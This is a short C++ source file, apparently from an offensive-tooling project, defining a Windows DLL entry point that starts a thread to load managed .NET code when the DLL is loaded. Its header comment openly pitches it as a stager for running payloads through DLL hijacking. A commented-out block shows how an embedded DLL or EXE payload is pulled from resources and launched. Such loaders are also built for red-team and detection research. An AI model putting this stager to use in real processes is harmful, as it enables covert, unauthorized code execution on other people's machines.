// dllmain.cpp : Defines the entry point for the DLL application.
/*
	Author: The Wover
	Description: Provides a DllMain entry point so that our stager can execute when the DLL is loaded by a process.
		Lets you load your .NET code through any normal DLL Hijacking or similar technique.
*/
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include "native.h"


static DWORD WINAPI launcher(void* h)
{

	std::cout << "Created thread to load managed code...\n";

	/*
	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
		MAKEINTRESOURCEA(IDR_DLLENCLOSED1), "DLLENCLOSED");
	if (res)
	{

		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
		if (dat)
		{
			unsigned char *dll =
				static_cast<unsigned char*>(::LockResource(dat));
			if (dll)
			{
				size_t len = SizeofResource(static_cast<HMODULE>(h), res);

				//TODO: Get it to pass in arguments. Preferably using a String Table Resource.

				//TODO: Check whether we are supposed to

				//Update this with the correct fully-qualified class name and method name
				//LaunchDll(dll, len, "DemoAssemblyDLL.Demo", "Test");

				//Use this instead if the payload is an EXE.
				//LaunchEXE(dll, len);
			}
		}
	}*/

	Example_Managed_CallNative();

	return 0;
};

extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
	if (reasonForCall == DLL_PROCESS_ATTACH)
	{
		//Create a new thread from our proxy native function to avoid Loader Lock
		CreateThread(0, 0, launcher, h, 0, 0);
	}
	return TRUE;
}